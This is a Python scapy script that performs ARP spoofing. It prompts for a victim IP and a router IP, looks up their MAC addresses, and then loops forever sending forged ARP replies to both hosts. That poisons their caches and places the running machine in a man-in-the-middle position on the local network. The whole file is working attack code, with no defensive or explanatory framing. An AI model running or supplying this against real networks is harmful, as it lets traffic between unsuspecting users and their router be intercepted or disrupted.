import scapy.all as scapy
import sys
import time



def arp_spoof(target_ip: str, spoof_ip: str, attempts = 5):
    target_mac = get_mac(target_ip)
    while target_mac is None and attempts > 0:
        print(f"Retrying... Attempts left: {attempts}")
        time.sleep(2)  # Wait for 2 seconds before retrying
        target_mac = get_mac(target_ip)
        attempts -= 1

    if target_mac is None:
        print(f"Could not find MAC address for {target_ip} after several attempts. Exiting...")
        sys.exit(1)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def get_mac(ip: str):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        print(f'MAC of {ip}: {answered_list[0][1].hwsrc}')
        return answered_list[0][1].hwsrc
    else:
        print(f"No response received for IP: {ip}")
        return None

    return answered_list[0][1].hwsrc


victim_ip = input('Victim IP: ')  # taking the victim ip_address
router_ip = input('Router IP: ')  # taking the router ip address
sent_packets_count = 0  # initializing the packet counter
while True:
    sent_packets_count += 2
    arp_spoof(victim_ip, router_ip)
    arp_spoof(router_ip, victim_ip)
    print("[+] Packets sent " + str(sent_packets_count), end="\r")
    sys.stdout.flush()
    time.sleep(2)


